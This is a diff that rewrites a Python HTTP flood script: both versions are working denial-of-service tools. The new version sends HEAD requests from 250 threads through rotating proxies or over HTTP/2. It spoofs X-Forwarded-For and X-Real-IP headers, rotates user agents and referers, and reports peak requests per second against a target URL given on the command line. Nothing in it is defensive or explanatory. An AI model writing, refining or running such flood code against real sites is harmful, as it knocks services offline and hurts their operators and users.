@@ -1,127 +1,111 @@
-import socket, ssl, random, threading, time, sys, os
+import requests
+import random
+import threading
+import time
+import sys
+import httpx
 
 # Load files
-def load_file(filename, fallback=[]):
-    if os.path.exists(filename):
+def load_file(filename):
+    try:
         with open(filename, 'r') as f:
             return [line.strip() for line in f if line.strip()]
-    return fallback
+    except:
+        return []
 
-proxies = load_file('proxy.txt') or load_file('proxies.txt')
-user_agents = load_file('ua.txt') or [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
-    'Mozilla/5.0 (X11; Linux x86_64)',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)',
-    'Mozilla/5.0 (Linux; Android 11; Mobile)'
-]
-referers = load_file('refs.txt') or ['https://google.com']
+# Load user agents, referers, and proxies
+user_agents = load_file('ua.txt') or ["Mozilla/5.0"]
+referers = load_file('refs.txt') or ["https://google.com"]
+proxies = load_file('proxy.txt') + load_file('proxies.txt')
 
-if len(sys.argv) < 3:
-    print('Usage: python attack.py [target] [duration]')
-    sys.exit(1)
+# Random IP generator for headers
+def random_ip():
+    return '.'.join(str(random.randint(1, 255)) for _ in range(4))
 
-target = sys.argv[1]
-duration = int(sys.argv[2])
+# Generate random headers for requests
+def generate_headers():
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Referer": random.choice(referers),
+        "X-Forwarded-For": random_ip(),
+        "X-Real-IP": random_ip(),
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+    }
 
-parsed = target.replace('https://', '').replace('http://', '').split('/', 1)
-target_host = parsed[0]
-target_path = '/' + parsed[1] if len(parsed) > 1 else '/'
-target_port = 443
+# Send flood requests function
+def send_flood(target, time_limit, max_threads):
+    attempted, success, failed = 0, 0, 0
+    lock = threading.Lock()
+    start_time = time.time()
 
-# Stats
-total_requests = 0
-success_requests = 0
-failed_requests = 0
-current_rps = 0
-peak_rps = 0
+    def attack():
+        nonlocal attempted, success, failed
+        while time.time() - start_time < time_limit:
+            headers = generate_headers()
+            proxy = random.choice(proxies) if proxies else None
 
-lock = threading.Lock()
-
-def random_choice(lst):
-    return random.choice(lst)
-
-def send_request():
-    global total_requests, success_requests, failed_requests, current_rps
-
-    while True:
-        try:
-            proxy = random_choice(proxies)
-            proxy_ip, proxy_port = proxy.split(':')
-            user_agent = random_choice(user_agents)
-            referer = random_choice(referers)
-
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((proxy_ip, int(proxy_port)))
-            connect_str = f"CONNECT {target_host}:443 HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
-            sock.sendall(connect_str.encode())
-
-            response = sock.recv(4096)
-            if b'200' not in response:
-                sock.close()
+            try:
+                if proxy:
+                    proxies_format = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                    res = requests.head(target, headers=headers, proxies=proxies_format, timeout=3)
+                else:
+                    with httpx.Client(http2=True, timeout=3) as client:
+                        res = client.head(target, headers=headers)
+                
                 with lock:
-                    failed_requests += 1
-                continue
+                    attempted += 1
+                    if res.status_code < 500:
+                        success += 1
+                    else:
+                        failed += 1
 
-            context = ssl.create_default_context()
-            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
+            except Exception:
+                with lock:
+                    attempted += 1
+                    failed += 1
 
-            req = f"GET {target_path} HTTP/1.1\r\n" \
-                  f"Host: {target_host}\r\n" \
-                  f"User-Agent: {user_agent}\r\n" \
-                  f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
-                  f"Accept-Language: en-US,en;q=0.9\r\n" \
-                  f"Referer: {referer}\r\n" \
-                  f"Connection: Keep-Alive\r\n\r\n"
+    threads = []
+    for _ in range(max_threads):
+        t = threading.Thread(target=attack)
+        t.start()
+        threads.append(t)
 
-            ssl_sock.sendall(req.encode())
-            ssl_sock.close()
+    for t in threads:
+        t.join(timeout=time_limit)
 
-            with lock:
-                total_requests += 1
-                success_requests += 1
-                current_rps += 1
+    elapsed = round(time.time() - start_time, 2)
+    if elapsed > 20:
+        elapsed = 20
 
-        except Exception:
-            with lock:
-                total_requests += 1
-                failed_requests += 1
+    peak = round(attempted / elapsed, 2)
+    return attempted, success, failed, peak, elapsed
 
-def monitor():
-    global current_rps, peak_rps
-    while True:
-        time.sleep(1)
-        with lock:
-            if current_rps > peak_rps:
-                peak_rps = current_rps
-            print(f"Total Requests: {total_requests} | RPS: {current_rps}")
-            current_rps = 0
+# Running the flood
+def run_flood(target, duration):
+    total, success, failed, peak, elapsed = send_flood(target, duration, 250)
+    print(f"Total Requests Sent: {total}")
+    print(f"Success Requests: {success}")
+    print(f"Failed Requests: {failed}")
+    print(f"Peak RPS: {peak}")
+    print(f"Total Time Taken: {elapsed} seconds")
 
-print(f"\nFlooding Target: {target}")
-print(f"Using {len(proxies)} Proxies.\n")
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python3 main.py <target_url> <duration_in_seconds>")
+        sys.exit(1)
 
-threads = []
+    target_url = sys.argv[1]
+    duration = int(sys.argv[2])
 
-# Start monitor thread
-monitor_thread = threading.Thread(target=monitor)
-monitor_thread.daemon = True
-monitor_thread.start()
-
-# Start attack threads
-for _ in range(os.cpu_count() * 2):
-    t = threading.Thread(target=send_request)
-    t.daemon = True
-    threads.append(t)
-    t.start()
-
-# Run for duration
-time.sleep(duration)
-
-print('\nAttack Finished.')
-print(f"Peak RPS: {peak_rps}")
-print(f"SUCCESS: {success_requests}")
-print(f"FAILED: {failed_requests}")
-
-sys.exit(0)
-            
+    # Run flood directly from VPS
+    run_flood(target_url, duration)
+    
